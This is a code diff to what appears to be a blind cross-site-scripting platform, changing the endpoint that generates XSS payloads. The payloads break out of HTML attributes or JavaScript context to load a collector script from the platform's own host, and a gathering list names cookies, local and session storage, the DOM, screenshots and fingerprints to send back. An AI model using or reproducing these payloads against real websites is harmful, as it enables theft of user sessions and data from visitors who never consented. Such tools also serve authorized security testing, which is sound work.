@@ -16,6 +16,8 @@ PAYLOADS = {
     "referrer": 'referrer="+encodeURIComponent(document.referrer)+"',
 }
 
+DATA_TO_GATHER = {"local_storage", "session_storage", "cookies", "origin_url", "referrer", "dom", "screenshot", "fingerprint"}
+
 
 @bp.route("/xss/generate", methods=["POST"])
 @jwt_required()
@@ -48,11 +50,9 @@ def xss_generate():
 
     if code_type == "html":
         if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
-            payload_start = f'\'>"><script src={url}/static/collector.min.js></script><script>sendData("'
-            payload_mid = base64.b64encode(
-                str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "tags": tag_list}))
-            ).decode()
-            payload_end = '")</script>'
+            payload_start = f'\'>"><script src={url}/static/collector.min.js data="'
+            payload_mid = base64.b64encode(str.encode(",".join([xss_type, client.uid, ";".join(DATA_TO_GATHER - set(to_gather)), ";".join(tag_list)]))).decode()
+            payload_end = '"></script>'
             payload = payload_start + payload_mid + payload_end
             return jsonify({"status": "OK", "detail": payload}), 200
 
@@ -77,12 +77,10 @@ def xss_generate():
 
     else:
         if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
-            payload_start = f';}};var js=document.createElement("script");js.src="{url}/static/collector.min.js";js.onload=function(){{sendData("'
-            payload_mid = base64.b64encode(
-                str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "tags": tag_list}))
-            ).decode()
+            payload_start = f';}};var js=document.createElement("script");js.src="{url}/static/collector.min.js";js.setAttribute("data", "'
+            payload_mid = base64.b64encode(str.encode(",".join([xss_type, client.uid, ";".join(DATA_TO_GATHER - set(to_gather)), ";".join(tag_list)]))).decode()
 
-            payload_end = '")};document.body.appendChild(js);'
+            payload_end = '");document.body.appendChild(js);'
             payload = payload_start + payload_mid + payload_end
             return jsonify({"status": "OK", "detail": payload}), 200
 
